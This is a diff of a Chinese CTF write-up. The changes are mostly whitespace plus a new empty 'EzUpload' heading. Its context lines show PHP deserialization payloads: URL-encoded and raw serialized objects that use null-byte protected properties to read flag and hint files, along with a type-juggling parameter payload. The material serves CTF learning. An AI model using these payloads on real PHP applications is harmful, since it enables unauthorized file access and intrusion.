@@ -20,8 +20,6 @@ Exp：
 O%3A3%3A%22PHP%22%3A5%3A%7Bs%3A8%3A%22%00PHP%00PHP%22%3BO%3A4%3A%22bash%22%3A3%3A%7Bs%3A1%3A%22z%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A1%3A%22x%22%3Bs%3A4%3A%22null%22%3Bs%3A1%3A%22y%22%3Bs%3A4%3A%22null%22%3B%7Ds%3A9%3A%22%00PHP%00java%22%3Bs%3A5%3A%22noway%22%3Bs%3A1%3A%22c%22%3Bs%3A12%3A%22s1502113478a%22%3Bs%3A6%3A%22python%22%3BN%3Bs%3A4%3A%22bash%22%3BN%3B%7D%3Cbr%3E
 ```
 
-
-
 Payload:
 
 ```
@@ -90,8 +88,6 @@ Payload：?param1=s878926199a&&param2=s155964671a&&param3[]=1&&param4[]=2
 
 ![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)
 
-
-
 ### 0x03 easyWEB
 
 打开页面发现就是一个输入框，输入了几次都是error
@@ -146,7 +142,7 @@ Payload：?param1=s878926199a&&param2=s155964671a&&param3[]=1&&param4[]=2
 
 在构造protected变量的序列化过程中存在\00字符，表现为不可见字符，需要手动添加，位置为环绕\*字符左右各一个，同时s要大写表示后面允许使用\00的表达
 
-最终payload: 
+最终payload:
 
 ```
 O:11:"FileHandler":4:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:32:"/var/www/html/fllllaiig/hint.php";S:10:"\00*\00content";S:3:"111";S:9:"\00*\00passwd";S:7:"5201314";}
@@ -169,4 +165,12 @@ Payload：
 跳转到phpinfo界面，在disable\_function处发现flag：
 
 ![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image024.png)
+
+
+
+### 0x04 EzUpload
+
+
+
+
 
